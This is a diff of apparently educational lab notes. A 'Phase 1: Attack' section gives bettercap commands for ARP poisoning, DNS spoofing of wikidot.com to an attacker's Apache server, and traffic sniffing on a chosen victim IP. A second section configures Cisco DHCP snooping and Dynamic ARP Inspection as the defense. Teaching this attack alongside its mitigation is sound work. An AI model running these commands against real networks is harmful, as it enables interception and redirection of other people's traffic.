@@ -14,39 +14,39 @@ https://youtu.be/8abLuPq8g7c
 
 # Phase 1: Attack
 
-# Change IP Forwarding in Kali Linux so that auto packet drop is disabled:
+Change IP Forwarding in Kali Linux so that auto packet drop is disabled:
 sudo echo 1 > /proc/sys/net/ipv4/ip_forward
 
-# Change Windows registry to Enable IP Forwarding:
+Change Windows registry to Enable IP Forwarding:
 In registry editor browse to  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters
 Modify the value of the parameter IPEnableRouter from 0 to 1 and close the registry editor window
 Restart your system and execute the command "netsh interface ipv4 show interface <if id>" to verify whether IP forwarding is enabled.
 
-# Bettercap for Kali Linux (May not be natively installed and must be run with sudo privelages):
+Bettercap for Kali Linux (May not be natively installed and must be run with sudo privelages):
 sudo bettercap
 
-# Probe the network to see a list of devices connected:
+Probe the network to see a list of devices connected:
 net.probe on
 
-# Lists all devices on the network with their MAC address and IP address
+Lists all devices on the network with their MAC address and IP address
 net.show
 
-# Tells the program to target not only the IP address, but also the gateway that it's connected to so that you can see traffic going both ways:
+Tells the program to target not only the IP address, but also the gateway that it's connected to so that you can see traffic going both ways:
 set arp.spoof.fullduplex true
 
-# Set your desired target IP address for ARP spoofing:
+Set your desired target IP address for ARP spoofing:
 set arp.spoof.targets <ip address>
 
-# Setting up DNS spoof so that when the target connects to "wikidot.com" it redirects the traffic to the attacking Kali Linux apache server:
+Setting up DNS spoof so that when the target connects to "wikidot.com" it redirects the traffic to the attacking Kali Linux apache server:
 set dns.spoof.domains wikidot.com
 
-# Launch ARP poisoning attack:
+Launch ARP poisoning attack:
 arp.spoof on
 
-# Turns the DNS spoof on:
+Turns the DNS spoof on:
 dns.spoof on
 
-# Turn the network sniffer on to see the traffic from the victim and the gateway:
+Turn the network sniffer on to see the traffic from the victim and the gateway:
 net.sniff on
 
 
@@ -55,28 +55,28 @@ net.sniff on
 
 *** The following instructions are for configuration of Dynamic ARP Inspection on Cisco managed switches ***
 
-# Open / Connect to the CLI of the Cisco managed switch.
+Open / Connect to the CLI of the Cisco managed switch.
 
-# Enter user execution mode:
+Enter user execution mode:
 en
 
-# Enter global configuration mode:
+Enter global configuration mode:
 config t
 
-# Enable DHCP Snooping globally:
+Enable DHCP Snooping globally:
 ip dhcp snooping
 
 (DHCP snooping will disallow all DHCP "offer" and "acknowledge" packets through the switch, except on the ports we set as Trusted. This will prevent any other device from acting as the DHCP server)
 
-# Enter configuration mode for the interface connected to the DHCP server:
+Enter configuration mode for the interface connected to the DHCP server:
 interface <dhcp_connected_interface>
 
-# Trust the interface connected to the DHCP server:
+Trust the interface connected to the DHCP server:
 ip dhcp snooping trust
 
-# Exit the interface configuration and enter global configuration:
+Exit the interface configuration and enter global configuration:
 Ctrl + Z
 config t
 
-# Enable Dynamic ARP Inspection on the desired VLAN:
+Enable Dynamic ARP Inspection on the desired VLAN:
 ip arp inspection vlan <#_vlan>
